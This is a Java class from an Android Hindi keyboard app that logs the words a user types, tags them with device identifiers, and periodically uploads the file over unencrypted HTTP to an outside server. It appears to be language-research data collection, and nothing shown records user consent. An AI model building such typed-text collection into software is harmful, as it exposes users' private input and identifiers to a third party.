package iit.android.swarachakra;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Set;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.util.Log;

public class KeyLogger {
	private static long uploadFreq = 7 * 24 * 60; // every 6 days
	private static long uploadtimestamp = 0;
	private static final String stringUrl = "http://idid.in/android/storeaway.php";
	private static final String map = "muppetymaphindi.dat";
	private static final String language = "heendey";
	public final String TAG = "logger";
	private HashMap<String,Integer> ht;
	public String extractedText;
	private SoftKeyboard mSoftKeyboard;
	String draft_msg="";
	
	public void setSoftKeyboard(SoftKeyboard softKeyboard) {
		mSoftKeyboard = softKeyboard;
	}

	public void writeToLocalStorage() {
		String str = extractedText;
		readMap(map);
		Log.d(TAG, "Map read into file done");

		// break text into words
		String[] words;
		try {
			if (str.isEmpty() || str.length() <= 0) {
				Log.d(TAG, "Nothing to save");
				return;
			}
			words = str.split(" ");
		} catch (Exception ex) {
			Log.d(TAG, ex.getCause().toString());
			return;
		}

		// trim space, punctuation marks or perhaps let the server do it
		// str.replaceAll(".", "");
		// str.trim();

		// Insert-update into db / write to storage
		// Log.d(TAG,"About to read map");
		for (int i = 0; i < words.length; i++) {
			// Log.d(TAG,"word: "+words[i]);
			addToMap(words[i]);
		}
		Log.d(TAG, "Done adding map");

		writeMapToFile();
		Log.d(TAG, "Done writing map");

		// uploadFile();
		long tmpTS = System.currentTimeMillis();
		Log.d(TAG, "uploadTS" + uploadtimestamp + ", current TS " + tmpTS);

		if (uploadtimestamp == 0) {
			uploadtimestamp = tmpTS;
			Log.d(TAG, "No upload");
		} else if ((tmpTS - uploadtimestamp) / (60 * 1000) >= uploadFreq) {
			// uploadtimestamp=tmpTS;
			uploadToServer();
		} else {
			Log.d(TAG, "No upload");
		}

		// set the dirty flag

	}

	@SuppressWarnings("unchecked")
	public void readMap(String filename) {

		/*
		 * File file = new File(map);
		 * 
		 * if(file.exists()==false){ //create a new hash map
		 * Log.d(TAG,"--hash map empty. create new"); ht=new HashMap();
		 * 
		 * }
		 */
		// else
		// {
		// Load from file into ht
		Log.d(TAG, "Load from file.");
		try {

			/*
			 * ht = new Hashtable<Integer, ArrayList<Deck>>(); FileInputStream
			 * myIn = context.openFileInput(FLASHCARDS_FILENAME);
			 * ObjectInputStream IS = new ObjectInputStream(myIn);
			 * Toast.makeText(context, "here", Toast.LENGTH_SHORT).show();
			 */
			ht = new HashMap<String, Integer>();

			// File file = new File(getExternalFilesDir(null), map);

			FileInputStream myIn = mSoftKeyboard.openFileInput(map);
			ObjectInputStream IS = new ObjectInputStream(myIn);

			try {

				// temp = (Hashtable<Integer, ArrayList<Deck>>)IS.readObject();
				// IS.
				HashMap<String, Integer> readObject = (HashMap<String, Integer>) IS
						.readObject();
				ht = readObject;
				Set<String> tmpSet = ht.keySet();
				Object[] tmpArray = (Object[]) tmpSet.toArray();

				// Log.d(TAG,"map length:"+tmpArray.length);
				for (int i = 0; i < tmpArray.length; i++) {
					Log.d(TAG, i + "-key:" + (String) tmpArray[i] + ", value: "
							+ ht.get(tmpArray[i]));
				}

				IS.close();
				myIn.close();
				// Log.d(TAG,"Map ready for use");

			} catch (Exception e) {
				// TODO Auto-generated catch block
				// e.printStackTrace();
				Log.d(TAG, "Some exception trying to read map");
				Log.d(TAG, e.getMessage());

			}
			// IS.close();

			// testing purposes
			/*
			 * for (int i = 0; i < temp.size(); i++) { for (int p = 0; p <
			 * temp.get(i).size(); p++) { for (int q = 0; q <
			 * temp.get(i).get(p).getDeck().size(); q++) {
			 * Toast.makeText(context,
			 * temp.get(i).get(p).getDeck().get(q).getQuestion(),
			 * Toast.LENGTH_LONG).show(); } } }
			 */
		} catch (IOException e) {
			// e.printStackTrace();
			Log.d(TAG, e.getMessage());
			// Toast.makeText(context, "here", Toast.LENGTH_SHORT).show();
		}
		// } //else
		// }
	}

	public void addToMap(String key) {

		boolean setUUIDValues = false;
		// if map empty just add the entry
		// chk if the value exists
		try {
			if (ht.isEmpty() == true) {
				// put in the unique install identifier we generated, hardware
				// serial no. SERIAL and the 64-bit ANDROID_ID value
				setUUIDValues = true;
			}

			if ((ht.isEmpty() == false && ht.containsKey(key) == true)) {

				// if it does, increment its count
				Integer c = ht.get(key);
				// Log.d(TAG,"Map not empty and "+key+ "found wid freq "+c);
				ht.put(key, c + 1);
				// Log.d(TAG,key+ " frequency now "+ht.get(key));
			} else {
				// list must be empty or key not found, insert the key
				// Log.d(TAG,"Map empty or key found");
				ht.put(key, 1);

			}

			if (setUUIDValues == true) {
				// Unique identifiers
				ht.put(Installation.id(mSoftKeyboard.getApplicationContext()).toString(), -1);
				ht.put(android.os.Build.SERIAL, -2);
				ht.put(android.provider.Settings.Secure.ANDROID_ID, -3);
				ht.put(language, -4);
			}
		} catch (Exception ex) {
			Log.d(TAG, ex.getCause().toString());
		}
		// Log.d(TAG,"Map length after adding 1 more key "+ht.size());
		// else, add it to the map with count 1
		// ht.put(key, value);

	}

	@SuppressWarnings("finally")
	public String uploadFile() {

		/*
		 * try{
		 * 
		 * }catch(Exception e){ Log.d(TAG,e.getMessage()); }
		 */

		HttpURLConnection connection = null;
		DataOutputStream outputStream = null;

		String pathToOurFile = map;
		String urlServer = stringUrl;// "http://idid.in/android/storeaway.php";
		String lineEnd = "\r\n";
		String twoHyphens = "--";
		String boundary = "*****";

		int bytesRead, bytesAvailable, bufferSize;
		byte[] buffer;
		int maxBufferSize = 1 * 1024 * 1024;
		String serverResponseMessage = "Upload failed";

		try {
			FileInputStream fileInputStream = new FileInputStream(
					mSoftKeyboard.getBaseContext().getFileStreamPath(pathToOurFile));

			URL url = new URL(urlServer);
			connection = (HttpURLConnection) url.openConnection();

			// Allow Inputs & Outputs
			connection.setDoInput(true);
			connection.setDoOutput(true);
			connection.setUseCaches(false);

			// Enable POST method
			connection.setRequestMethod("POST");

			connection.setRequestProperty("Connection", "Keep-Alive");
			connection.setRequestProperty("Content-Type",
					"multipart/form-data;boundary=" + boundary);

			outputStream = new DataOutputStream(connection.getOutputStream());
			outputStream.writeBytes(twoHyphens + boundary + lineEnd);
			outputStream
					.writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\""
							+ pathToOurFile + "\"" + lineEnd);
			outputStream.writeBytes(lineEnd);

			bytesAvailable = fileInputStream.available();
			bufferSize = Math.min(bytesAvailable, maxBufferSize);
			buffer = new byte[bufferSize];

			// Read file
			bytesRead = fileInputStream.read(buffer, 0, bufferSize);

			while (bytesRead > 0) {
				outputStream.write(buffer, 0, bufferSize);
				bytesAvailable = fileInputStream.available();
				bufferSize = Math.min(bytesAvailable, maxBufferSize);
				bytesRead = fileInputStream.read(buffer, 0, bufferSize);
			}

			outputStream.writeBytes(lineEnd);
			outputStream.writeBytes(twoHyphens + boundary + twoHyphens
					+ lineEnd);

			// Responses from the server (code and message)
			int serverResponseCode = connection.getResponseCode();
			serverResponseMessage = connection.getResponseMessage();

			fileInputStream.close();
			outputStream.flush();
			outputStream.close();
			Log.d(TAG, "resp code: " + serverResponseCode + " , resp string: "
					+ serverResponseMessage);
			if (serverResponseCode == 200
					|| serverResponseMessage.contains("ok")) {
				Log.d(TAG, "Delete the file " + map);
				long tmpTS = System.currentTimeMillis();
				uploadtimestamp = tmpTS;
				deleteNamedFile(map);
			}
		} catch (Exception ex) {
			// Exception handling
			Log.d(TAG, ex.getMessage());
		} finally {
			return serverResponseMessage;
		}

	}

	@SuppressWarnings("unused")
	public boolean hasExternalStoragePrivateFile(String fName) {
		// Get path for the file on external storage. If external
		// storage is not currently mounted this will fail.
		File file = new File(mSoftKeyboard.getExternalFilesDir(null), fName);
		if (file != null) {
			return file.exists();
		}
		return false;
	}

	public void writeMapToFile() {

		try {
			FileOutputStream fos = mSoftKeyboard.openFileOutput(map, Context.MODE_PRIVATE);
			// Log.d(TAG,"Open fileos. Map length "+ht.size());

			ObjectOutputStream osw = new ObjectOutputStream(fos);
			osw.writeObject(ht);
			osw.flush();
			fos.close();
			osw.close();

		} catch (FileNotFoundException e) {
			// catch errors opening file
			// e.printStackTrace();
			Log.d(TAG, e.getMessage());

		} catch (IOException e) {
			// e.printStackTrace();
			Log.d(TAG, e.getMessage());
			// Toast.makeText(context, "calles", Toast.LENGTH_SHORT).show();
		}

	}

	// deleteFile
	public void deleteNamedFile(String filename) {
		// Log.d(TAG,"Delete "+filename);

		try {
			File file = mSoftKeyboard.getBaseContext().getFileStreamPath(filename);
			boolean status = file.delete();

			if (status)
				Log.d(TAG, "Deleted " + filename);
			else
				Log.d(TAG, "Couldnt delete " + filename);
		} catch (Exception e) {
			Log.d(TAG, e.getMessage());

		}

	}

	// when connection available, upload to the server

	public void uploadToServer() {
		// get the text to upload
		// String uploadText=readFromFile("swcLog.txt");
		// String stringUrl = "http://idid.in/storeaway.php?words="+uploadText;
		// String stringUrl = "http://idid.in/android/storeaway.php";
		// System.out.println("Connecting to");
		Log.d(TAG, "Connecting to " + stringUrl);
		// System.out.println(stringUrl);
		try {
			ConnectivityManager connMgr = (ConnectivityManager) mSoftKeyboard.getSystemService(Context.CONNECTIVITY_SERVICE);
			NetworkInfo networkInfo = connMgr.getActiveNetworkInfo();
			if (networkInfo != null && networkInfo.isConnected()) {
				Log.d(TAG, networkInfo.getTypeName());
				Log.d(TAG, networkInfo.getSubtypeName());
				Log.d(TAG, networkInfo.toString());
				Log.d(TAG, "Apparently nw is available");
				new SendStatsTask().execute(stringUrl);
				// Log.d(TAG, "Apparently nw is available");
			} else {
				// System.out.println("No network connection available.");
				Log.d(TAG, "No network connection available.");
				connMgr.setNetworkPreference(ConnectivityManager.TYPE_MOBILE);
				if (connMgr.getActiveNetworkInfo().isConnected()) {
					Log.d(TAG, "Using mobile data");
					new SendStatsTask().execute(stringUrl);
				}
				Log.d(TAG, "No go for mobile data either");
			}

		} catch (Exception e) {
			Log.d(TAG, e.getMessage());

		}
		// if successful delete local data

	}

	// Given a URL, establishes an HttpUrlConnection and retrieves
	// the web page content as a InputStream, which it returns as
	// a string.

	// Uses AsyncTask to create a task away from the main UI thread. This task
	// takes a
	// URL string and uses it to create an HttpUrlConnection. Once the
	// connection
	// has been established, the AsyncTask downloads the contents of the webpage
	// as
	// an InputStream. Finally, the InputStream is converted into a string,
	// which is
	// displayed in the UI by the AsyncTask's onPostExecute method.
	public class SendStatsTask extends AsyncTask<String, Void, String> {
		// @Override
		protected String doInBackground(String... urls) {
			// return downloadUrl(urls[0]);
			// return sendLog();
			// String uploadText=readFromFile("swcLog.txt");

			// Log.d(TAG,"In thread..trying to connect..sending-"+uploadText);
			Log.d(TAG, "In thread..trying to connect..sending-");
			// return postData(urls[0],
			// "postwords="+URLEncoder.encode(uploadText));
			return uploadFile();
		}

		// onPostExecute displays the results of the AsyncTask.
		@Override
		protected void onPostExecute(String result) {
			// textView.setText(result);
			// System.out.println(result);
			Log.d(TAG, "Result returned");
			if (result.isEmpty()) {
				Log.d(TAG, "Result string empty");
				return;
			}
			if (result.contains("ok:200")) {
				Log.d(TAG, "Delete log file");
				deleteNamedFile(map);
			}
		}
	}
}